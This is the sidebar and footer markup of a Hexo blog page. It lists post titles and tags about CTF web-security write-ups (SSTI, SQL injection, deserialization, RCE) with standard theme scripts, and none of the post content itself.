            <span class="archive-post-date">08/20</span>
            <a class="archive-post-title" href="/2025/08/20/bottle%E6%A1%86%E6%9E%B6%E7%9B%B8%E5%85%B3%E9%A2%98%E7%9B%AE/">bottle框架相关题目（待更）</a>
        </li>
        <li class="archive-post-item">
            <span class="archive-post-date">08/17</span>
            <a class="archive-post-title" href="/2025/08/17/%E5%A5%87%E5%A6%99%E7%9A%84json_decode/">奇妙的json_decode</a>
        </li>
        <li class="archive-post-item">
            <span class="archive-post-date">08/05</span>
            <a class="archive-post-title" href="/2025/08/05/BaseCTF-Web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">BaseCTF-Web部分题解</a>
        </li>
        <li class="archive-post-item">
            <span class="archive-post-date">07/28</span>
            <a class="archive-post-title" href="/2025/07/28/Perl-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94-CSAWQual-2016-I-Got-ID/">Perl 文件上传—— [CSAWQual 2016]I_Got_ID</a>
        </li>
        <li class="archive-post-item">
            <span class="archive-post-date">07/28</span>
            <a class="archive-post-title" href="/2025/07/28/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%95%B4%E7%90%86/">SQL报错注入整理</a>
        </li>
        <li class="archive-post-item">
            <span class="archive-post-date">07/28</span>
            <a class="archive-post-title" href="/2025/07/28/Java%E5%8F%8D%E5%B0%84%E5%92%8CCC%E9%93%BE/">Java反射和CC链</a>
        </li>
        <li class="archive-post-item">
            <span class="archive-post-date">07/26</span>
            <a class="archive-post-title" href="/2025/07/26/Exception-Error-%E7%B1%BB%E7%BB%95%E8%BF%87md5%E3%80%81sha1%E2%80%94%E2%80%94-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-greatphp/">Exception,Error 类绕过md5、sha1—— [极客大挑战 2020]greatphp</a>
        </li>
        <li class="archive-post-item">
            <span class="archive-post-date">07/21</span>
            <a class="archive-post-title" href="/2025/07/21/SSTI/">SSTI</a>
        </li>
        <li class="archive-post-item">
            <span class="archive-post-date">07/18</span>
            <a class="archive-post-title" href="/2025/07/18/L3NCTF-Web%E9%A2%98%E7%9B%AE%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/">L3NCTF-Web题目部分复现</a>
        </li>
        <li class="archive-post-item">
            <span class="archive-post-date">07/18</span>
            <a class="archive-post-title" href="/2025/07/18/sqlmap%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E5%B0%8F%E8%AE%B0/">sqlmap源码阅读小记</a>
        </li>
        <li class="archive-post-item">
            <span class="archive-post-date">07/18</span>
            <a class="archive-post-title" href="/2025/07/18/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E5%90%88%E9%9B%86/">反序列化题目合集</a>
        </li>
        <li class="archive-post-item">
            <span class="archive-post-date">07/16</span>
            <a class="archive-post-title" href="/2025/07/16/Tomcat-JSP-servlet-war%E2%80%94%E2%80%94-WUSTCTF-2020-train-yourself-to-be-godly/">Tomcat,JSP,servlet,war——[WUSTCTF 2020]train yourself to be godly</a>
        </li>
        <li class="archive-post-item">
            <span class="archive-post-date">07/15</span>
            <a class="archive-post-title" href="/2025/07/15/JAVA%E5%89%8D%E7%BD%AE%E6%A6%82%E5%BF%B5%E5%B0%8F%E8%AE%B0/">JAVA前置概念小记</a>
        </li>
        <li class="archive-post-item">
            <span class="archive-post-date">07/13</span>
            <a class="archive-post-title" href="/2025/07/13/%E5%B0%8F%E5%88%BB%E4%B9%9F%E8%83%BD%E8%AF%BB%E6%87%82%E7%9A%84%E4%BD%86%E5%BE%85%E6%9B%B4%E2%80%94%E2%80%94-NCTF-2023-EvilMQ/">小刻也能读懂的但待更——[NCTF 2023]EvilMQ</a>
        </li>
        <li class="archive-post-item">
            <span class="archive-post-date">07/09</span>
            <a class="archive-post-title" href="/2025/07/09/session-%E4%B8%8E%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E2%80%94%E2%80%94-HNCTF-2022-QAQ-1inclu4e/">session 与条件竞争——[HNCTF 2022]QAQ_1inclu4e</a>
        </li>
        <li class="archive-post-item">
            <span class="archive-post-date">07/08</span>
            <a class="archive-post-title" href="/2025/07/08/SOME-%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94-HCTF-2017-Deserted-place/">SOME 攻击—— [HCTF 2017]Deserted place</a>
        </li>
        <li class="archive-post-item">
            <span class="archive-post-date">07/08</span>
            <a class="archive-post-title" href="/2025/07/08/PHP-%E5%B8%B8%E8%A7%81%E6%97%A0%E5%8F%82%E5%87%BD%E6%95%B0%E2%80%94%E2%80%94-HNCTF-2022-WEEK2-Canyource/">PHP 常见无参函数—— [HNCTF 2022 WEEK2]Canyource </a>
        </li>
        <li class="archive-post-item">
            <span class="archive-post-date">05/26</span>
            <a class="archive-post-title" href="/2025/05/26/LitCTF-Web%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/">LitCTF-Web方向题解</a>
        </li>
        <li class="archive-post-item">
            <span class="archive-post-date">04/30</span>
            <a class="archive-post-title" href="/2025/04/30/%E5%82%BB%E5%AD%90%E9%83%BD%E8%83%BD%E7%9C%8B%E6%87%82%E7%9A%84SSTI%E5%85%A5%E9%97%A8/">傻子都能看懂的SSTI入门</a>
        </li>
        <li class="archive-post-item">
            <span class="archive-post-date">04/29</span>
            <a class="archive-post-title" href="/2025/04/29/%E7%BA%A2%E9%98%9F%E7%AC%94%E8%AE%B0/">红队笔记</a>
        </li>
        <li class="archive-post-item">
            <span class="archive-post-date">03/26</span>
            <a class="archive-post-title" href="/2025/03/26/CTFSHOW%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/">CTFSHOW 刷题汇总</a>
        </li>
        <li class="archive-post-item">
            <span class="archive-post-date">02/26</span>
            <a class="archive-post-title" href="/2025/02/26/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%80%9A%E6%8A%A5/">自动化漏洞通报</a>
        </li>
            </ul>
    </div>
</div>

        <div class="sidebar-panel-tags">
    <div class="sidebar-tags-name">
            <span class="sidebar-tag-name" data-tags="wp">
                <span class="iconfont-archer">&#xe606;</span>
                wp
            </span>
            <span class="sidebar-tag-name" data-tags="Java">
                <span class="iconfont-archer">&#xe606;</span>
                Java
            </span>
            <span class="sidebar-tag-name" data-tags="Perl">
                <span class="iconfont-archer">&#xe606;</span>
                Perl
            </span>
            <span class="sidebar-tag-name" data-tags="CGI">
                <span class="iconfont-archer">&#xe606;</span>
                CGI
            </span>
            <span class="sidebar-tag-name" data-tags="文件上传">
                <span class="iconfont-archer">&#xe606;</span>
                文件上传
            </span>
            <span class="sidebar-tag-name" data-tags="PHP原生类">
                <span class="iconfont-archer">&#xe606;</span>
                PHP原生类
            </span>
            <span class="sidebar-tag-name" data-tags="RCE">
                <span class="iconfont-archer">&#xe606;</span>
                RCE
            </span>
            <span class="sidebar-tag-name" data-tags="WAF绕过">
                <span class="iconfont-archer">&#xe606;</span>
                WAF绕过
            </span>
            <span class="sidebar-tag-name" data-tags="PHP">
                <span class="iconfont-archer">&#xe606;</span>
                PHP
            </span>
            <span class="sidebar-tag-name" data-tags="无参">
                <span class="iconfont-archer">&#xe606;</span>
                无参
            </span>
            <span class="sidebar-tag-name" data-tags="报错注入">
                <span class="iconfont-archer">&#xe606;</span>
                报错注入
            </span>
            <span class="sidebar-tag-name" data-tags="SOME">
                <span class="iconfont-archer">&#xe606;</span>
                SOME
            </span>
            <span class="sidebar-tag-name" data-tags="Nginx">
                <span class="iconfont-archer">&#xe606;</span>
                Nginx
            </span>
            <span class="sidebar-tag-name" data-tags="bottle">
                <span class="iconfont-archer">&#xe606;</span>
                bottle
            </span>
            <span class="sidebar-tag-name" data-tags="SSTI">
                <span class="iconfont-archer">&#xe606;</span>
                SSTI
            </span>
            <span class="sidebar-tag-name" data-tags="pickle反序列化">
                <span class="iconfont-archer">&#xe606;</span>
                pickle反序列化
            </span>
            <span class="sidebar-tag-name" data-tags="上传压缩包">
                <span class="iconfont-archer">&#xe606;</span>
                上传压缩包
            </span>
            <span class="sidebar-tag-name" data-tags="session">
                <span class="iconfont-archer">&#xe606;</span>
                session
            </span>
            <span class="sidebar-tag-name" data-tags="条件竞争">
                <span class="iconfont-archer">&#xe606;</span>
                条件竞争
            </span>
            <span class="sidebar-tag-name" data-tags="Tomcat">
                <span class="iconfont-archer">&#xe606;</span>
                Tomcat
            </span>
            <span class="sidebar-tag-name" data-tags="笔记">
                <span class="iconfont-archer">&#xe606;</span>
                笔记
            </span>
            <span class="sidebar-tag-name" data-tags="json">
                <span class="iconfont-archer">&#xe606;</span>
                json
            </span>
            <span class="sidebar-tag-name" data-tags="DNS">
                <span class="iconfont-archer">&#xe606;</span>
                DNS
            </span>
    </div>
    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
    </div> 
    <div class="sidebar-tags-list"></div>
</div>

        <div class="sidebar-panel-categories">
    <div class="sidebar-categories-name">
    </div>
    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
    <div class="sidebar-categories-list"></div>
</div>

    </div>
</div>

        <!-- site-meta -->
        <script>
    var siteMetaRoot = "/"
    if (siteMetaRoot === "undefined") {
        siteMetaRoot = '/'
    }
    var siteMeta = {
        url: "http://example.com",
        root: siteMetaRoot,
        author: "温柔刀"
    }
</script>

        <!-- import experimental options here -->
        <!-- Custom Font -->

        <!-- main func -->
        <script src="/scripts/main.js"></script>
        <!-- fancybox -->
        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.umd.js" onload="window.Fancybox.bind('[data-fancybox]')" defer></script>
        <!-- algolia -->
        <!-- busuanzi -->
            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
        <!-- async load share.js -->
            <script src="/scripts/share.js" async></script>
        <!-- mermaid -->
    </body>
</html>
